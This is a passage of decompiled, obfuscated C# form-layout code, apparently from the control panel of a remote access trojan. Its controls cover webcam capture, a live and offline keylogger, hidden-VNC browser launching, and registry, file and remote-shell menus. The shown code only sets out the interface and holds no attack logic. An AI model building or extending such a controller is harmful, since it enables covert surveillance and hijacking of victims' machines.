        this.vmethod_120().set_AnimationSpeed(1);
        this.vmethod_120().BackColor = SystemColors.Control;
        this.vmethod_120().BackgroundImage = (Image) manager.GetObject("pbProcesses.BackgroundImage");
        this.vmethod_120().Font = new Font("Microsoft Sans Serif", 22f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_120().ForeColor = Color.Black;
        this.vmethod_120().set_LineProgressThickness(8);
        this.vmethod_120().set_LineThickness(10);
        this.vmethod_120().Location = new Point(0x194, 0xb6);
        this.vmethod_120().Margin = new Padding(15, 12, 15, 12);
        this.vmethod_120().set_MaximumValue(0x3e8);
        this.vmethod_120().Name = "pbProcesses";
        this.vmethod_120().set_ProgressBackColor(Color.Gainsboro);
        this.vmethod_120().set_ProgressColor(Color.LightBlue);
        paremeters.set_HeightShift(20);
        paremeters.set_HorizontalShift(10);
        paremeters.set_VerticalShift(10);
        paremeters.set_WidthShift(20);
        this.vmethod_120().set_Rectangle(paremeters);
        this.vmethod_120().set_ShowText(false);
        this.vmethod_120().Size = new Size(0xa2, 0xa2);
        this.vmethod_120().TabIndex = 0x1a;
        this.vmethod_120().set_Value(0);
        this.vmethod_120().Visible = false;
        this.vmethod_518().BackgroundImage = (Image) manager.GetObject("btnFilemanagerSearch.BackgroundImage");
        this.vmethod_518().BackgroundImageLayout = ImageLayout.Stretch;
        this.vmethod_518().Location = new Point(0x66, 4);
        this.vmethod_518().Margin = new Padding(2);
        this.vmethod_518().Name = "btnFilemanagerSearch";
        this.vmethod_518().Size = new Size(0x18, 0x18);
        this.vmethod_518().TabIndex = 0x2e;
        this.vmethod_518().UseVisualStyleBackColor = true;
        this.vmethod_472().set_Animated(true);
        this.vmethod_472().set_AnimationInterval(0);
        this.vmethod_472().set_AnimationSpeed(1);
        this.vmethod_472().BackColor = SystemColors.Window;
        this.vmethod_472().BackgroundImage = (Image) manager.GetObject("pbFilemanagerObjects.BackgroundImage");
        this.vmethod_472().Font = new Font("Microsoft Sans Serif", 22f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_472().ForeColor = Color.Black;
        this.vmethod_472().set_LineProgressThickness(8);
        this.vmethod_472().set_LineThickness(10);
        this.vmethod_472().Location = new Point(0x239, 200);
        this.vmethod_472().Margin = new Padding(15, 12, 15, 12);
        this.vmethod_472().set_MaximumValue(0x3e8);
        this.vmethod_472().Name = "pbFilemanagerObjects";
        this.vmethod_472().set_ProgressBackColor(Color.Gainsboro);
        this.vmethod_472().set_ProgressColor(Color.LightBlue);
        paremeters2.set_HeightShift(20);
        paremeters2.set_HorizontalShift(10);
        paremeters2.set_VerticalShift(10);
        paremeters2.set_WidthShift(20);
        this.vmethod_472().set_Rectangle(paremeters2);
        this.vmethod_472().set_ShowText(false);
        this.vmethod_472().Size = new Size(160, 160);
        this.vmethod_472().TabIndex = 0x2a;
        this.vmethod_472().set_Value(0);
        this.vmethod_472().Visible = false;
        this.vmethod_452().BackgroundImage = (Image) manager.GetObject("BtnFilemanagerRefresh.BackgroundImage");
        this.vmethod_452().BackgroundImageLayout = ImageLayout.Stretch;
        this.vmethod_452().Enabled = false;
        this.vmethod_452().Location = new Point(0xce, 4);
        this.vmethod_452().Margin = new Padding(2);
        this.vmethod_452().Name = "BtnFilemanagerRefresh";
        this.vmethod_452().Size = new Size(0x18, 0x18);
        this.vmethod_452().TabIndex = 40;
        this.vmethod_452().UseVisualStyleBackColor = true;
        this.vmethod_450().BackgroundImage = (Image) manager.GetObject("btnFilemanagerHome.BackgroundImage");
        this.vmethod_450().BackgroundImageLayout = ImageLayout.Stretch;
        this.vmethod_450().Enabled = false;
        this.vmethod_450().Location = new Point(0xb2, 4);
        this.vmethod_450().Margin = new Padding(2);
        this.vmethod_450().Name = "btnFilemanagerHome";
        this.vmethod_450().Size = new Size(0x18, 0x18);
        this.vmethod_450().TabIndex = 0x27;
        this.vmethod_450().UseVisualStyleBackColor = true;
        this.vmethod_448().BackgroundImage = (Image) manager.GetObject("btnFilemanagerNext.BackgroundImage");
        this.vmethod_448().BackgroundImageLayout = ImageLayout.Stretch;
        this.vmethod_448().Enabled = false;
        this.vmethod_448().Location = new Point(0x21, 4);
        this.vmethod_448().Margin = new Padding(2);
        this.vmethod_448().Name = "btnFilemanagerNext";
        this.vmethod_448().Size = new Size(0x18, 0x18);
        this.vmethod_448().TabIndex = 0x26;
        this.vmethod_448().UseVisualStyleBackColor = true;
        this.vmethod_446().BackgroundImage = (Image) manager.GetObject("btnFilemanagerBack.BackgroundImage");
        this.vmethod_446().BackgroundImageLayout = ImageLayout.Stretch;
        this.vmethod_446().Enabled = false;
        this.vmethod_446().Location = new Point(5, 4);
        this.vmethod_446().Margin = new Padding(2);
        this.vmethod_446().Name = "btnFilemanagerBack";
        this.vmethod_446().Size = new Size(0x18, 0x18);
        this.vmethod_446().TabIndex = 0x25;
        this.vmethod_446().UseVisualStyleBackColor = true;
        this.vmethod_264().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_264().BorderStyle = BorderStyle.FixedSingle;
        this.vmethod_264().Location = new Point(0, 0x2b);
        this.vmethod_264().Margin = new Padding(2);
        this.vmethod_264().Name = "pbWebcam";
        this.vmethod_264().Size = new Size(0x3d0, 0x1f6);
        this.vmethod_264().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_264().TabIndex = 0x1c;
        this.vmethod_264().TabStop = false;
        this.vmethod_290().set_Animated(true);
        this.vmethod_290().set_AnimationInterval(0);
        this.vmethod_290().set_AnimationSpeed(1);
        this.vmethod_290().BackColor = SystemColors.Control;
        this.vmethod_290().BackgroundImage = (Image) manager.GetObject("pbKeylogOffline.BackgroundImage");
        this.vmethod_290().Font = new Font("Microsoft Sans Serif", 22f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_290().ForeColor = Color.Black;
        this.vmethod_290().set_LineProgressThickness(8);
        this.vmethod_290().set_LineThickness(10);
        this.vmethod_290().Location = new Point(0x1a2, 0xc4);
        this.vmethod_290().Margin = new Padding(15, 12, 15, 12);
        this.vmethod_290().set_MaximumValue(0x3e8);
        this.vmethod_290().Name = "pbKeylogOffline";
        this.vmethod_290().set_ProgressBackColor(Color.Gainsboro);
        this.vmethod_290().set_ProgressColor(Color.LightBlue);
        paremeters3.set_HeightShift(20);
        paremeters3.set_HorizontalShift(10);
        paremeters3.set_VerticalShift(10);
        paremeters3.set_WidthShift(20);
        this.vmethod_290().set_Rectangle(paremeters3);
        this.vmethod_290().set_ShowText(false);
        this.vmethod_290().Size = new Size(0xa2, 0xa2);
        this.vmethod_290().TabIndex = 30;
        this.vmethod_290().set_Value(0);
        this.vmethod_290().Visible = false;
        this.vmethod_364().set_Animated(true);
        this.vmethod_364().set_AnimationInterval(0);
        this.vmethod_364().set_AnimationSpeed(1);
        this.vmethod_364().BackColor = SystemColors.Control;
        this.vmethod_364().BackgroundImage = (Image) manager.GetObject("pbConnectionsObjects.BackgroundImage");
        this.vmethod_364().Font = new Font("Microsoft Sans Serif", 22f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_364().ForeColor = Color.Black;
        this.vmethod_364().set_LineProgressThickness(8);
        this.vmethod_364().set_LineThickness(10);
        this.vmethod_364().Location = new Point(0x199, 0xcf);
        this.vmethod_364().Margin = new Padding(15, 12, 15, 12);
        this.vmethod_364().set_MaximumValue(0x3e8);
        this.vmethod_364().Name = "pbConnectionsObjects";
        this.vmethod_364().set_ProgressBackColor(Color.Gainsboro);
        this.vmethod_364().set_ProgressColor(Color.LightBlue);
        paremeters4.set_HeightShift(20);
        paremeters4.set_HorizontalShift(10);
        paremeters4.set_VerticalShift(10);
        paremeters4.set_WidthShift(20);
        this.vmethod_364().set_Rectangle(paremeters4);
        this.vmethod_364().set_ShowText(false);
        this.vmethod_364().Size = new Size(160, 160);
        this.vmethod_364().TabIndex = 0x1f;
        this.vmethod_364().set_Value(0);
        this.vmethod_364().Visible = false;
        this.vmethod_682().Image = (Image) manager.GetObject("pbInfoForceProfile.Image");
        this.vmethod_682().Location = new Point(0x1d8, 9);
        this.vmethod_682().Margin = new Padding(2);
        this.vmethod_682().Name = "pbInfoForceProfile";
        this.vmethod_682().Size = new Size(15, 15);
        this.vmethod_682().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_682().TabIndex = 0x5e;
        this.vmethod_682().TabStop = false;
        this.vmethod_680().Image = (Image) manager.GetObject("pbInfoIncognito.Image");
        this.vmethod_680().Location = new Point(0x148, 9);
        this.vmethod_680().Margin = new Padding(2);
        this.vmethod_680().Name = "pbInfoIncognito";
        this.vmethod_680().Size = new Size(15, 15);
        this.vmethod_680().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_680().TabIndex = 0x5c;
        this.vmethod_680().TabStop = false;
        this.vmethod_464().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
        this.vmethod_464().BorderStyle = BorderStyle.FixedSingle;
        this.vmethod_464().Location = new Point(2, 30);
        this.vmethod_464().Margin = new Padding(2);
        this.vmethod_464().Name = "pbRemoteBrowser";
        this.vmethod_464().Size = new Size(0x3cc, 0x1a8);
        this.vmethod_464().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_464().TabIndex = 0x1f;
        this.vmethod_464().TabStop = false;
        this.vmethod_548().set_Animated(true);
        this.vmethod_548().set_AnimationInterval(0);
        this.vmethod_548().set_AnimationSpeed(1);
        this.vmethod_548().BackColor = SystemColors.Control;
        this.vmethod_548().BackgroundImage = (Image) manager.GetObject("pbSoftwareObjects.BackgroundImage");
        this.vmethod_548().Font = new Font("Microsoft Sans Serif", 22f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_548().ForeColor = Color.Black;
        this.vmethod_548().set_LineProgressThickness(8);
        this.vmethod_548().set_LineThickness(10);
        this.vmethod_548().Location = new Point(0x1ec, 0xcc);
        this.vmethod_548().Margin = new Padding(15, 12, 15, 12);
        this.vmethod_548().set_MaximumValue(0x3e8);
        this.vmethod_548().Name = "pbSoftwareObjects";
        this.vmethod_548().set_ProgressBackColor(Color.Gainsboro);
        this.vmethod_548().set_ProgressColor(Color.LightBlue);
        paremeters5.set_HeightShift(20);
        paremeters5.set_HorizontalShift(10);
        paremeters5.set_VerticalShift(10);
        paremeters5.set_WidthShift(20);
        this.vmethod_548().set_Rectangle(paremeters5);
        this.vmethod_548().set_ShowText(false);
        this.vmethod_548().Size = new Size(160, 160);
        this.vmethod_548().TabIndex = 0x34;
        this.vmethod_548().set_Value(0);
        this.vmethod_548().Visible = false;
        this.vmethod_576().set_Animated(true);
        this.vmethod_576().set_AnimationInterval(0);
        this.vmethod_576().set_AnimationSpeed(1);
        this.vmethod_576().BackColor = SystemColors.Control;
        this.vmethod_576().BackgroundImage = (Image) manager.GetObject("pbServices.BackgroundImage");
        this.vmethod_576().Font = new Font("Microsoft Sans Serif", 22f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_576().ForeColor = Color.Black;
        this.vmethod_576().set_LineProgressThickness(8);
        this.vmethod_576().set_LineThickness(10);
        this.vmethod_576().Location = new Point(0x195, 0xb6);
        this.vmethod_576().Margin = new Padding(15, 12, 15, 12);
        this.vmethod_576().set_MaximumValue(0x3e8);
        this.vmethod_576().Name = "pbServices";
        this.vmethod_576().set_ProgressBackColor(Color.Gainsboro);
        this.vmethod_576().set_ProgressColor(Color.LightBlue);
        paremeters6.set_HeightShift(20);
        paremeters6.set_HorizontalShift(10);
        paremeters6.set_VerticalShift(10);
        paremeters6.set_WidthShift(20);
        this.vmethod_576().set_Rectangle(paremeters6);
        this.vmethod_576().set_ShowText(false);
        this.vmethod_576().Size = new Size(0xa2, 0xa2);
        this.vmethod_576().TabIndex = 0x30;
        this.vmethod_576().set_Value(0);
        this.vmethod_576().Visible = false;
        this.vmethod_622().set_Animated(true);
        this.vmethod_622().set_AnimationInterval(0);
        this.vmethod_622().set_AnimationSpeed(1);
        this.vmethod_622().BackColor = SystemColors.Control;
        this.vmethod_622().BackgroundImage = (Image) manager.GetObject("pbWindows.BackgroundImage");
        this.vmethod_622().Font = new Font("Microsoft Sans Serif", 22f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_622().ForeColor = Color.Black;
        this.vmethod_622().set_LineProgressThickness(8);
        this.vmethod_622().set_LineThickness(10);
        this.vmethod_622().Location = new Point(0x195, 0xb6);
        this.vmethod_622().Margin = new Padding(15, 12, 15, 12);
        this.vmethod_622().set_MaximumValue(0x3e8);
        this.vmethod_622().Name = "pbWindows";
        this.vmethod_622().set_ProgressBackColor(Color.Gainsboro);
        this.vmethod_622().set_ProgressColor(Color.LightBlue);
        paremeters7.set_HeightShift(20);
        paremeters7.set_HorizontalShift(10);
        paremeters7.set_VerticalShift(10);
        paremeters7.set_WidthShift(20);
        this.vmethod_622().set_Rectangle(paremeters7);
        this.vmethod_622().set_ShowText(false);
        this.vmethod_622().Size = new Size(0xa2, 0xa2);
        this.vmethod_622().TabIndex = 0x34;
        this.vmethod_622().set_Value(0);
        this.vmethod_622().Visible = false;
        this.vmethod_752().set_Animated(true);
        this.vmethod_752().set_AnimationInterval(0);
        this.vmethod_752().set_AnimationSpeed(1);
        this.vmethod_752().BackColor = SystemColors.Window;
        this.vmethod_752().BackgroundImage = (Image) manager.GetObject("pbRegistryObjects.BackgroundImage");
        this.vmethod_752().Font = new Font("Microsoft Sans Serif", 22f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_752().ForeColor = Color.Black;
        this.vmethod_752().set_LineProgressThickness(8);
        this.vmethod_752().set_LineThickness(10);
        this.vmethod_752().Location = new Point(0x239, 200);
        this.vmethod_752().Margin = new Padding(15, 12, 15, 12);
        this.vmethod_752().set_MaximumValue(0x3e8);
        this.vmethod_752().Name = "pbRegistryObjects";
        this.vmethod_752().set_ProgressBackColor(Color.Gainsboro);
        this.vmethod_752().set_ProgressColor(Color.LightBlue);
        paremeters8.set_HeightShift(20);
        paremeters8.set_HorizontalShift(10);
        paremeters8.set_VerticalShift(10);
        paremeters8.set_WidthShift(20);
        this.vmethod_752().set_Rectangle(paremeters8);
        this.vmethod_752().set_ShowText(false);
        this.vmethod_752().Size = new Size(160, 160);
        this.vmethod_752().TabIndex = 0x3a;
        this.vmethod_752().set_Value(0);
        this.vmethod_752().Visible = false;
        this.vmethod_724().BackgroundImage = (Image) manager.GetObject("btnRegistryRefresh.BackgroundImage");
        this.vmethod_724().BackgroundImageLayout = ImageLayout.Stretch;
        this.vmethod_724().Enabled = false;
        this.vmethod_724().Location = new Point(0xce, 4);
        this.vmethod_724().Margin = new Padding(2);
        this.vmethod_724().Name = "btnRegistryRefresh";
        this.vmethod_724().Size = new Size(0x18, 0x18);
        this.vmethod_724().TabIndex = 0x39;
        this.vmethod_724().UseVisualStyleBackColor = true;
        this.vmethod_726().BackgroundImage = (Image) manager.GetObject("btnRegistryHome.BackgroundImage");
        this.vmethod_726().BackgroundImageLayout = ImageLayout.Stretch;
        this.vmethod_726().Enabled = false;
        this.vmethod_726().Location = new Point(0xb2, 4);
        this.vmethod_726().Margin = new Padding(2);
        this.vmethod_726().Name = "btnRegistryHome";
        this.vmethod_726().Size = new Size(0x18, 0x18);
        this.vmethod_726().TabIndex = 0x38;
        this.vmethod_726().UseVisualStyleBackColor = true;
        this.vmethod_728().BackgroundImage = (Image) manager.GetObject("btnRegistryNext.BackgroundImage");
        this.vmethod_728().BackgroundImageLayout = ImageLayout.Stretch;
        this.vmethod_728().Enabled = false;
        this.vmethod_728().Location = new Point(0x21, 4);
        this.vmethod_728().Margin = new Padding(2);
        this.vmethod_728().Name = "btnRegistryNext";
        this.vmethod_728().Size = new Size(0x18, 0x18);
        this.vmethod_728().TabIndex = 0x37;
        this.vmethod_728().UseVisualStyleBackColor = true;
        this.vmethod_730().BackgroundImage = (Image) manager.GetObject("btnRegistryBack.BackgroundImage");
        this.vmethod_730().BackgroundImageLayout = ImageLayout.Stretch;
        this.vmethod_730().Enabled = false;
        this.vmethod_730().Location = new Point(5, 4);
        this.vmethod_730().Margin = new Padding(2);
        this.vmethod_730().Name = "btnRegistryBack";
        this.vmethod_730().Size = new Size(0x18, 0x18);
        this.vmethod_730().TabIndex = 0x36;
        this.vmethod_730().UseVisualStyleBackColor = true;
        this.vmethod_806().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_806().Image = Class131.smethod_24();
        this.vmethod_806().Location = new Point(0x1bf, 520);
        this.vmethod_806().Margin = new Padding(2);
        this.vmethod_806().Name = "pbHVNCPort";
        this.vmethod_806().Size = new Size(15, 15);
        this.vmethod_806().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_806().TabIndex = 0x70;
        this.vmethod_806().TabStop = false;
        this.vmethod_796().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_796().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_796().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_796().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_796().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_796().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_796().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_796().Border.HoverVisible = true;
        this.vmethod_796().Border.Rounding = 6;
        this.vmethod_796().Border.Thickness = 1;
        this.vmethod_796().Border.Type = ShapeTypes.Rounded;
        this.vmethod_796().Border.Visible = true;
        this.vmethod_796().DialogResult = DialogResult.None;
        this.vmethod_796().Enabled = false;
        this.vmethod_796().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_796().Image = Class131.smethod_23();
        this.vmethod_796().Location = new Point(0x39a, 0x205);
        this.vmethod_796().MouseState = MouseStates.Normal;
        this.vmethod_796().Name = "btnHVNCIE";
        this.vmethod_796().Size = new Size(0x2c, 0x17);
        this.vmethod_796().TabIndex = 0x6f;
        this.vmethod_796().Text = "IE";
        this.vmethod_796().TextImageRelation = TextImageRelation.TextBeforeImage;
        this.vmethod_796().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_796().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_796().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_796().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_796().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_796().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_796().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_798().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_798().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_798().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_798().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_798().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_798().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_798().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_798().Border.HoverVisible = true;
        this.vmethod_798().Border.Rounding = 6;
        this.vmethod_798().Border.Thickness = 1;
        this.vmethod_798().Border.Type = ShapeTypes.Rounded;
        this.vmethod_798().Border.Visible = true;
        this.vmethod_798().DialogResult = DialogResult.None;
        this.vmethod_798().Enabled = false;
        this.vmethod_798().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_798().Image = Class131.smethod_46();
        this.vmethod_798().Location = new Point(0x260, 0x205);
        this.vmethod_798().MouseState = MouseStates.Normal;
        this.vmethod_798().Name = "btnHVNCRun";
        this.vmethod_798().Size = new Size(0x3e, 0x17);
        this.vmethod_798().TabIndex = 110;
        this.vmethod_798().Text = "Run";
        this.vmethod_798().TextImageRelation = TextImageRelation.TextBeforeImage;
        this.vmethod_798().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_798().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_798().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_798().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_798().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_798().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_798().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_800().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_800().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_800().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_800().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_800().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_800().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_800().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_800().Border.HoverVisible = true;
        this.vmethod_800().Border.Rounding = 6;
        this.vmethod_800().Border.Thickness = 1;
        this.vmethod_800().Border.Type = ShapeTypes.Rounded;
        this.vmethod_800().Border.Visible = true;
        this.vmethod_800().DialogResult = DialogResult.None;
        this.vmethod_800().Enabled = false;
        this.vmethod_800().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_800().Image = Class131.smethod_16();
        this.vmethod_800().Location = new Point(0x349, 0x205);
        this.vmethod_800().MouseState = MouseStates.Normal;
        this.vmethod_800().Name = "btnHVNCFF";
        this.vmethod_800().Size = new Size(0x4b, 0x17);
        this.vmethod_800().TabIndex = 0x6d;
        this.vmethod_800().Text = "FireFox";
        this.vmethod_800().TextImageRelation = TextImageRelation.TextBeforeImage;
        this.vmethod_800().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_800().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_800().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_800().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_800().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_800().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_800().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_802().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_802().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_802().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_802().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_802().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_802().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_802().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_802().Border.HoverVisible = true;
        this.vmethod_802().Border.Rounding = 6;
        this.vmethod_802().Border.Thickness = 1;
        this.vmethod_802().Border.Type = ShapeTypes.Rounded;
        this.vmethod_802().Border.Visible = true;
        this.vmethod_802().DialogResult = DialogResult.None;
        this.vmethod_802().Enabled = false;
        this.vmethod_802().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_802().Image = Class131.smethod_9();
        this.vmethod_802().Location = new Point(760, 0x205);
        this.vmethod_802().MouseState = MouseStates.Normal;
        this.vmethod_802().Name = "btnHVNCChrome";
        this.vmethod_802().Size = new Size(0x4b, 0x17);
        this.vmethod_802().TabIndex = 0x6c;
        this.vmethod_802().Text = "Chrome";
        this.vmethod_802().TextImageRelation = TextImageRelation.TextBeforeImage;
        this.vmethod_802().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_802().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_802().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_802().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_802().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_802().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_802().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_804().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_804().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_804().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_804().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_804().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_804().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_804().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_804().Border.HoverVisible = true;
        this.vmethod_804().Border.Rounding = 6;
        this.vmethod_804().Border.Thickness = 1;
        this.vmethod_804().Border.Type = ShapeTypes.Rounded;
        this.vmethod_804().Border.Visible = true;
        this.vmethod_804().DialogResult = DialogResult.None;
        this.vmethod_804().Enabled = false;
        this.vmethod_804().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_804().Image = Class131.smethod_14();
        this.vmethod_804().Location = new Point(0x2a6, 0x205);
        this.vmethod_804().MouseState = MouseStates.Normal;
        this.vmethod_804().Name = "btnHVNCExplorer";
        this.vmethod_804().Size = new Size(0x4c, 0x17);
        this.vmethod_804().TabIndex = 0x6b;
        this.vmethod_804().Text = "Explorer";
        this.vmethod_804().TextImageRelation = TextImageRelation.TextBeforeImage;
        this.vmethod_804().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_804().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_804().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_804().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_804().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_804().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_804().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_4().Image = (Image) manager.GetObject("InformationToolStripMenuItem.Image");
        this.vmethod_4().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_4().Name = "InformationToolStripMenuItem";
        this.vmethod_4().Size = new Size(0x89, 0x16);
        this.vmethod_4().Text = "Information";
        this.vmethod_324().Image = (Image) manager.GetObject("AudioToolStripMenuItem.Image");
        this.vmethod_324().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_324().Name = "AudioToolStripMenuItem";
        this.vmethod_324().Size = new Size(0x7f, 0x16);
        this.vmethod_324().Text = "Audio";
        this.vmethod_16().Image = (Image) manager.GetObject("ScreenToolStripMenuItem.Image");
        this.vmethod_16().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_16().Name = "ScreenToolStripMenuItem";
        this.vmethod_16().Size = new Size(0x7f, 0x16);
        this.vmethod_16().Text = "Screen";
        this.vmethod_266().Image = (Image) manager.GetObject("WebcamToolStripMenuItem.Image");
        this.vmethod_266().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_266().Name = "WebcamToolStripMenuItem";
        this.vmethod_266().Size = new Size(0x7f, 0x16);
        this.vmethod_266().Text = "Webcam";
        ToolStripItem[] itemArray51 = new ToolStripItem[] { this.vmethod_274(), this.vmethod_276(), this.vmethod_278() };
        this.vmethod_272().DropDownItems.AddRange(itemArray51);
        this.vmethod_272().Image = (Image) manager.GetObject("KeyloggerToolStripMenuItem.Image");
        this.vmethod_272().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_272().Name = "KeyloggerToolStripMenuItem";
        this.vmethod_272().Size = new Size(0x7f, 0x16);
        this.vmethod_272().Text = "Keylogger";
        this.vmethod_274().Name = "KeyloggerLiveToolStripMenuItem";
        this.vmethod_274().Size = new Size(110, 0x16);
        this.vmethod_274().Text = "Live";
        this.vmethod_276().Name = "ToolStripMenuItem12";
        this.vmethod_276().Size = new Size(0x6b, 6);
        this.vmethod_278().Name = "KeyloggerOfflineToolStripMenuItem";
        this.vmethod_278().Size = new Size(110, 0x16);
        this.vmethod_278().Text = "Offline";
        this.vmethod_68().Image = (Image) manager.GetObject("FilesToolStripMenuItem.Image");
        this.vmethod_68().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_68().Name = "FilesToolStripMenuItem";
        this.vmethod_68().Size = new Size(0x8e, 0x16);
        this.vmethod_68().Text = "Files";
        this.vmethod_30().Image = (Image) manager.GetObject("ProcessesToolStripMenuItem.Image");
        this.vmethod_30().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_30().Name = "ProcessesToolStripMenuItem";
        this.vmethod_30().Size = new Size(0x8e, 0x16);
        this.vmethod_30().Text = "Processes";
        this.vmethod_756().Image = Class131.smethod_41();
        this.vmethod_756().ImageAlign = ContentAlignment.MiddleLeft;
        this.vmethod_756().ImageScaling = ToolStripItemImageScaling.None;
        this.vmethod_756().Name = "RegistryToolStripMenuItem";
        this.vmethod_756().Size = new Size(0x8e, 0x16);
        this.vmethod_756().Text = "Registry";
        this.vmethod_348().Image = (Image) manager.GetObject("RemoteShellToolStripMenuItem.Image");
        this.vmethod_348().ImageScaling = ToolStripItemImageScaling.None;
